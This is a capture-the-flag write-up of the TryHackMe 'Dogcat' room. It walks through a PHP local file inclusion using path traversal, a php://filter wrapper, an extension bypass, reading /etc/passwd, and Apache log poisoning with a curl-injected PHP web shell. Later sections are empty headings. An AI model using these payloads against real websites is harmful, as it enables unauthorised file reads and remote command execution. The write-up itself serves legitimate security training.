---
title: Dogcat
date: 2021-11-30 11:11:11 +/-TTTT
categories: [writeup, tryhackme]
tags: [lfi, docker, php]
---

I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

|Machine Name | Date | Level | Type |
|-------------|-------|------|------|
| Dogcat | 1 Dec 2021 | Medium | ctf |

![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png)


## Reconnaissance

Start the reconnaissance with nmap.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-01 00:40 EST
Nmap scan report for 10.10.222.120
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds

```

we have http and ssh services.

### http

On index.php we get two button's. and if we click any of them we get image of dog or cat. 
the uses `?view` parameter to fetch the image. that's is out initial foothold point.

![indexpage](/assets/thm/dogcat/indexpage.png)

If we tried simple lfi payload it will show ` Sorry, only dogs or cats are allowed. ` There may be some kind of filter is in place. tried some other lfi payload but all shows same error.

Maybe it expecte `dog` or `cat` as a base folder. 

Let's try `http://10.10.147.76/?view=dog/../../../../../../etc/passwd`

Now we got different error.

```
Warning: include(dog/../../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog/../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

```

From this error we can canclude :

1. it adds `php` extention to our input file
2. it expect `/dog/{payload}`

This web application uses `php 7.4.3` so we can not use `null byte injection` to overcome with first injection. we have to figure out something different.

if web app add `.php` extention to our paylaod we can tried to read source code of `index.php` and build our payload using source code.

if we try to read index.php using `http://10.10.147.76/?view=dog/../index`

it will show error.

```
Fatal error: Cannot redeclare containsStr() (previously declared in /var/www/html/index.php:17) in /var/www/html/index.php on line 17

```
In this situation we can use wrapper payload to read the files.

`http://10.10.147.76/?view=php://filter/convert.iconv.utf-8.utf-16/resource=dog/../index` 

*note: payload used from PayloadsAllTheThings (check resource section)*

![indexcode](/assets/thm/dogcat/indexcode.png)

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>

```

`$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`

web app first check if we add `ext` to file if not it will add `.php`. now we can bypass the `.php` extetion issue using `ext`


`http://10.10.147.76/?view=php://filter/convert.iconv.utf-8.utf-16/resource=dog/../../../../../../etc/passwd&ext` and we got `/etc/passwd`

![passwd](/assets/thm/dogcat/passwd.png)

The web application uses apache ( by wappalyzer) so we might be get shell by Poisoning.

## Gaining Access


we can read apache logs from file `/var/log/apache2/access.log`.

add php script to logfile .

`curl http://10.10.147.76 -A "<?php system(\$_GET['cmd']);?>"`

And we get cmd exection. 





## Privilege Escalation

## Notes

## Resources